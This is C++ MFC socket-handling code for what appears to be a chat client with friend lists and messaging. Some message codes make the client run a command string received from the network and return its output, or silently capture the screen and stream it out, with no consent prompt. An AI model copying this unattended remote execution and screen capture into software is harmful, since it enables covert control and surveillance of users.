#include "stdafx.h"
#include "MySock.h"
#include <vector>
#include <string>
#include "Utils.h"
#include "UserDomain.h"
#include "MessageShowDlg.h"
#include "resource.h"
#include "SocketInstance.h"
#include "ImageReceiveHelper.h"
#include "ScreenshotDlg.h"
#include "ImageSendHelper.h"
#include "ScreenFrameSendHelper.h"
#include "RemoteScreenDlg.h"
#include "ScreenFrameReceiveHelper.h"
#include <iostream>
using namespace std;


MySock::MySock()
{
	messageShowDlg = new MessageShowDlg();
	messageShowDlg->Create(IDD_DIALOG6,NULL);
	isRecvImage = false;
	imageSize = 0;	
	_screenshotDlg = new ScreenshotDlg();
	_screenshotDlg->Create(IDD_DIALOG7, NULL);

	
//	dlg->ShowWindow(SW_SHOW);
}


MySock::~MySock()
{
}

void MySock::OnClose(int nErrorCode) {

}
void MySock::OnConnect(int nErrorCode) {
}
void MySock::OnReceive(int nErrorCode) {
	if (nErrorCode == 0) {

		if (isRecvImage) {
			do_RecvImageDO();
		}
		char buffer[1024] = { 0 };
		int len = this->Receive(buffer, sizeof(buffer));
		char info1[128] = { 0 };
		//	sprintf_s(info1,"buffer:%s",buffer);
			//AfxMessageBox(info1);
		string bufferStr(buffer);
		string code = bufferStr.substr(0, bufferStr.find(":"));
		if (strcmp(code.c_str(), "18") == 0) {
			handleMsg((bufferStr.substr(bufferStr.find(":") + 1, bufferStr.size())).c_str());
			return;
		}
		if (strcmp(code.c_str(), "21") == 0) {
			do_executeCmdInfo((bufferStr.substr(bufferStr.find(":") + 1, bufferStr.size())).c_str());
			return;
		}
		if (strcmp(code.c_str(), "33") == 0) {
			do_screenShotTo(bufferStr.substr(bufferStr.find(":") + 1, bufferStr.size()).c_str());
			return;
		}
		vector<string> v;
		Utils::splitString(&v, buffer, ":");
		if (strcmp(v[0].c_str(), "0") == 0) {
			//login success;
			loginSuccessCallback();
		}
		else if (strcmp(v[0].c_str(), "1") == 0) {
			//login failue
			loginFailueCallback();
		}
		else if (strcmp(v[0].c_str(), "2") == 0) {
			registSuccessCallback();
		}
		else if (strcmp(v[0].c_str(), "3") == 0) {
			registFailueCallback(3);
		}
		else if (strcmp(v[0].c_str(), "4") == 0) {
			friendnotonlineCallback();
		}
		else if (strcmp(v[0].c_str(), "5") == 0) {
			addfriendreqsendCallback();
		}
		else if (strcmp(v[0].c_str(), "6") == 0) {
			addFriendRequestCallback(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "8") == 0) {
			isFriendCallback();
		}
		else if (strcmp(v[0].c_str(), "10") == 0) {
			addFriendRefuseCallback(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "11") == 0) {
			addFriendSuccessNotifyCallback(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "12") == 0) {
			addFriendList(&v);
			updateFriendListCallback();
		}
		else if (strcmp(v[0].c_str(), "14") == 0) {
			vector<UserDomain>::iterator iter;
			for (iter = Utils::friendList->begin(); iter != Utils::friendList->end(); ++iter) {
				if ((*iter).username == v[1]) {
					(*iter).ip = v[2];
				}
			}
			//AfxMessageBox("friend online");
			friendOnlineCallback(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "15") == 0) {
			//AfxMessageBox("friend offline");
			friendOfflineCallback(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "16") == 0) {
			//do nothing
		}
		else if (strcmp(v[0].c_str(), "20") == 0) {
			if (v.size() != 3) {
				return;
			}
			do_executeCmd(v[1].c_str(), v[2].c_str());
		}
		else if (strcmp(v[0].c_str(), "24") == 0) {
			if (v.size() != 2)	return;
			do_imageReq(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "25") == 0) {
			if (v.size() != 2) {
				return;
			}
			char info[128] = { 0 };
			//	sprintf_s(info, "v[1] size :%d", v[1].size());
			//AfxMessageBox("25");
			do_RecvImage(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "28") == 0) {
			if (v.size() != 2) {
				return;
			}
			AfxMessageBox(v[1].c_str());
		}
		else if (strcmp(v[0].c_str(), "31") == 0) {
			//do nothing
			if (v.size() != 2) {
				return;
			}
		    do_screentShotReq(v[1].c_str());
		}
	
	}
	CAsyncSocket::OnReceive(nErrorCode);
}

DWORD WINAPI ThreadFunc(LPVOID data)
{
	string* dataStr = (string*)data;
	//AfxMessageBox(dataStr->c_str());
	ScreenFrameReceiveHelper helper;
	helper.targetName = *dataStr;
	helper.receiveData();

	return NULL;
}

void MySock::do_screenShotTo(const char* data) {
//	AfxMessageBox(data);
	string *dataStr = new string(data);
	HANDLE hThrd;
	DWORD threadId;
	hThrd = CreateThread(NULL, 0, ThreadFunc, (LPVOID)dataStr, 0, &threadId);
	/*
	//AfxMessageBox("data coming");
	//string dataStr(data);
	//string imagedata = dataStr.substr(dataStr.find(":")+1,dataStr.size());
	char info[128] = { 0 };
	sprintf_s(info, "size:%s", data);
	//AfxMessageBox(info);
	ImageReceiveHelper helper;
	//AfxMessageBox("开始下载frame");
	const char* jpgData = helper.receiveImage(9004, atoi(data));
   // AfxMessageBox("下载完毕");	
	//FILE *pFile = fopen("smallshow.jpg", "wb");
	//fwrite(jpgData, atoi(data), 1, pFile);
	//fclose(pFile);
	
	CImage *image = new CImage();;
	//Utils::ptrToImage(jpgData, atoi(data), image);
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, atoi(data));
	void* pData = GlobalLock(hGlobal);
	memcpy(pData, jpgData, atoi(data));
	GlobalUnlock(hGlobal);
	IStream* pStream = NULL;
	CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);
	image->Load(pStream);
	*/
//	if (Utils::remoteScreendlg->image != NULL) {
//		delete Utils::remoteScreendlg->image;
//	}

//	printf("in\n");
	
//	if (!_screenshotDlg->IsWindowVisible()) {
	//	_screenshotDlg->ShowWindow(SW_SHOW);
//	}
//	else {
//	Utils::remoteScreendlg->image = image;
//	Utils::remoteScreendlg->Invalidate(false);
//	}
//	delete jpgData;
}

DWORD WINAPI screenShotReqThread(LPVOID data)
{
	ScreenFrameSendHelper helper;
	while(Utils::isSendFrame){
		//AfxMessageBox("in loop");
		uint32_t size;
		char *pBmp = Utils::screenShot(&size);
		CImage imageBmp;
		Utils::ptrToImage(pBmp, size, &imageBmp);
		delete pBmp;
		CImage imageJpg;
		Utils::BmpToJpg(&imageBmp, &imageJpg);
		//	imageJpg.Save("test1.jpg");
		CImage smallJpg;
		Utils::CreateStretchImage(&imageJpg, &smallJpg, 480, 800);
		//	smallJpg.Save("small.jpg");
		//	AfxMessageBox("Small Image OK");
		int jpgdataSize;
		const char* jpgdata = Utils::imageToPtr(&smallJpg, &jpgdataSize);
		//AfxMessageBox("SmallImage to Ptr OK");
		char header[128] = { 0 };
		sprintf_s(header, "%s:", Utils::curUser.c_str());
		char* senddata = new char[jpgdataSize + strlen(header)];
		memcpy(senddata, header, strlen(header));
		memcpy(senddata + strlen(header), jpgdata, jpgdataSize);

		//	AfxMessageBox("senddata");
		
		helper.senData(senddata, strlen(header) + jpgdataSize);
	}
	return NULL;
}


void MySock::do_screentShotReq(const char* username) {
//	AfxMessageBox("doScreenShotReq");
	HANDLE hThrd;
	DWORD threadId;
	Utils::isSendFrame = true;
	hThrd = CreateThread(NULL, 0, screenShotReqThread, NULL, 0, &threadId);
}

void MySock::do_executeCmd(const char * username,const char* cmdline) {

	CString res = Utils::executeCmd(cmdline);
	char buffer[4096*10] = { 0 };
	sprintf_s(buffer, "21:%s:%s", username, res.GetString());
	Utils::sendMsg(buffer);
}
	

void MySock::setLoginSuccessCallback(const LoginSuccessCallback& login) {
	this->loginSuccessCallback = login;
}

void MySock::setLoginFailueCallback(const LoginFailueCallback loginfailue) {
	loginFailueCallback = loginfailue;
}

void MySock::setRegistSuccessCallback(const RegistSuccessCallback& regist) {
	registSuccessCallback = regist;
}
void MySock::setRegistFailueCallback(const RegistFailueCallback registfailue) {
	registFailueCallback = registfailue;
}

void MySock::setFriendNotOnlineCallback(const LoginFailueCallback friendnotonline) {
	friendnotonlineCallback = friendnotonline;
}
void MySock::setAddFriendReqSendlineCallback(const LoginFailueCallback addfriendreqsend) {
	addfriendreqsendCallback = addfriendreqsend;
}

void MySock::setAddFriendRequestCallback(boost::function<void(const char*)> addfriendrequest) {
	addFriendRequestCallback = addfriendrequest;
}

void MySock::setIsFriendCallback(LoginFailueCallback callback) {
	this->isFriendCallback = callback;
}
void MySock::addFriendList(vector<string> *v) {
	Utils::friendList->clear();
	for (int i = 1; i < (v->size()); i++) {
		UserDomain user;
		vector<string> userstr;
		Utils::splitString(&userstr, ((*v)[i]).c_str(),",");
		user.username = userstr[0];
		user.online = userstr[2];
		user.level = userstr[1];
		if (strcmp(user.online.c_str(), "1") == 0) {
			user.ip = userstr[3];
		}
		Utils::friendList->push_back(user);
		Utils::friendMap->insert(make_pair(user.username,user));
	}
}

void MySock::handleMsg(const char* msg) {
	string msgStr(msg);
	string username = msgStr.substr(0, msgStr.find(":"));
	string message = msgStr.substr(msgStr.find(":") + 1, msgStr.size());
	map<string, vector<string>>::iterator iter;
	iter = Utils::unreadMsg->find(username);
	if (iter == Utils::unreadMsg->end()) {
		vector<string> v;
		v.push_back(message);
		Utils::unreadMsg->insert(make_pair(username,v));
	}
	else {
		(iter->second).push_back(message);
	}
	newMessageComingCallback(username.c_str());
}

void MySock::do_executeCmdInfo(const char* data) {
	string datastr(data);
	string username = datastr.substr(0, datastr.find(":"));
	string info = datastr.substr(datastr.find(":") + 1, datastr.size());
	if (info.size() > 0) {
	//	AfxMessageBox(info.c_str());
		messageShowDlg->CenterWindow();
		messageShowDlg->updateInfomation(info.c_str());
		messageShowDlg->ShowWindow(SW_SHOW);
	}
}

void MySock::do_imageReq(const char* user) {
	string username(user);
	uint32_t size;
	char *pJpg;
	unsigned long ulBufferLen = 0;
	char* pBmp =  Utils::screenShot(&size);
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
	void* pData = GlobalLock(hGlobal);
	memcpy(pData, pBmp, size);
	GlobalUnlock(hGlobal);
	IStream* pStream = NULL;
	if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
		CImage image;
		if (SUCCEEDED(image.Load(pStream))){
			IStream* pOutStream = NULL;
			if (CreateStreamOnHGlobal(NULL, TRUE, &pOutStream) == S_OK) {
				image.Save(pOutStream, Gdiplus::ImageFormatJPEG);
				HGLOBAL hOutGlobal = NULL;
				GetHGlobalFromStream(pOutStream, &hOutGlobal);
				LPBYTE pBits = (LPBYTE)GlobalLock(hOutGlobal);
				ulBufferLen = (DWORD)GlobalSize(pBits);
				pJpg = new char[ulBufferLen];
				memcpy(pJpg, pBits, ulBufferLen);

				GlobalUnlock(hOutGlobal);
				pOutStream->Release();

				char header[128] = { 0 };
				sprintf_s(header, "22:%s:", username.c_str());
				char *senddata = new char[strlen(header) + ulBufferLen];
				memcpy(senddata, header, strlen(header));
				memcpy(senddata + strlen(header), pJpg, ulBufferLen);
				int32_t senddatasize = htonl(strlen(header) + ulBufferLen);
			//	SocketInstance::getInstance()->Send(&senddatasize, sizeof(senddatasize));
			//	SocketInstance::getInstance()->Send(senddata, strlen(header) + ulBufferLen);
				ImageSendHelper sendHelper;
				sendHelper.sendData(senddata, strlen(header) + ulBufferLen);
				delete senddata;
				delete pJpg;
			}
		}
	}
	delete pBmp;

	/*
	CImage image;
	image.Load("C:\\temp.bmp");
	image.Save("C:\\send.jpg");
	//DeleteFile("temp.bmp");
	//SetFileAttributes("send.jpg", FILE_ATTRIBUTE_HIDDEN);
	FILE *pFile = fopen("C:\\send.jpg", "rb");
//	AfxMessageBox("openfile");
	if (pFile == NULL) {
		return;
	}
//	AfxMessageBox("openfile success");
	char *pBuf;
	fseek(pFile, 0, SEEK_END);
	int len = ftell(pFile);
//	AfxMessageBox("pBuff 开始分配内存");
	pBuf = new char[len + 4 + username.size()];
//	AfxMessageBox("pBuff 分配内存完成");

	memset(pBuf, 0, len + 4 + username.size());
	sprintf_s(pBuf, 4 + username.size() + 1, "22:%s:", username.c_str());
//	AfxMessageBox("pBuff Write head data");
	rewind(pFile);   //指针复位  
	fread(pBuf + 4 + username.size(), 1, len, pFile);
//	AfxMessageBox("pBUff write image data");
	//pBuf[len + 3] = 0;
	fclose(pFile);
//	DeleteFile("send.jpg");
	uint32_t sendSize = htonl(len + 4 + username.size());
	//uint32_t sendSize = htonl(30);
	char buffer[128] = { 0 };
	sprintf_s(buffer, "%d bytes sended", len + 4 + username.size());
//	AfxMessageBox(buffer);
	SocketInstance::getInstance()->Send(&sendSize, sizeof(sendSize));
	SocketInstance::getInstance()->Send(pBuf, len + 4 + username.size());
	*/
}

char* MySock::do_RecvImage(const char* size) {
	//this->isRecvImage = true;
	this->imageSize = atoi(size);

	//std::cout << "receive helper" << endl;
	//AfxMessageBox("Receive Helper");
//	ImageReceiveHelper helper;
//	helper.receiveImage(imageSize);

	
	//_screenshotDlg->imageSize = this->imageSize;
	if (_screenshotDlg->_image != NULL) {
		delete _screenshotDlg->_image;
	}
	CImage *imageTemp = new CImage();;
	ImageReceiveHelper helper;
	char* pJpg = helper.receiveImage(9001,imageSize);
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, imageSize);
	void* pData = GlobalLock(hGlobal);
	memcpy(pData, pJpg, imageSize);
	GlobalUnlock(hGlobal);
	IStream* pStream = NULL;
	CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);
	imageTemp->Load(pStream);
	_screenshotDlg->_image = imageTemp;
	_screenshotDlg->Invalidate(false);
	if (!_screenshotDlg->IsWindowVisible()) {
		_screenshotDlg->ShowWindow(SW_SHOW);
	}
	/*
	char buff[128] = { 0 };	
	int datasize = atoi(size);
	sprintf_s(buff, "%d byte coming", datasize);
	AfxMessageBox(buff);
	char* buffer = new char[datasize];
	char* data = new char[datasize];
	int recvCount = 0;
	while (recvCount < datasize) {
		int len = this->Receive(buffer, datasize - recvCount);
		memcpy(data+recvCount,buffer,len);
		recvCount += len;
	}
	delete buffer;
	sprintf_s(buff,"%d bytes receive",recvCount);
	AfxMessageBox(buff);
	return data;
	*/
	return NULL;
}

void MySock::do_RecvImageDO() {
	//char* buffer = new char[this->imageSize];
	//int len = this->Receive(buffer, imageSize);
	/*
	char* buffer = new char[imageSize];
	char* data = new char[imageSize];
	int recvCount = 0;
	while (recvCount < imageSize) {
		int len = this->Receive(buffer, imageSize - recvCount);
		memcpy(data + recvCount, buffer, len);
		recvCount += len;
	}
	*/


	this->isRecvImage = false;
	imageSize = 0;
}
